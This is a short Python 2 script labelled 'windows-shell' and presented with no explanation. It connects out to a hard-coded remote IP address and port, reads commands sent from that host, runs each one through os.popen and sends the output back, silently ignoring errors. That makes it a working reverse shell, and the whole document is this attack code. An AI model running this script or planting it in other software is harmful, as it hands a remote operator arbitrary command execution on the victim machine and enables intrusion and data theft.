#windows-shell
from socket import *
from time import ctime
# from subprocess import Popen,PIPE
import os
HOST ='123.206.15.80'
PORT =2333
BUFSIZE=1024
ADDR = (HOST,PORT)
tcpClient = socket(AF_INET,SOCK_STREAM)
tcpClient.connect(ADDR)

while True:
	try:
		data = tcpClient.recv(BUFSIZE)
		cmd =os.popen(data)
		data = cmd.read()
		print data
		tcpClient.send('[%s]%s '%(ctime(),data))
	except:
		pass
tcpClient.close()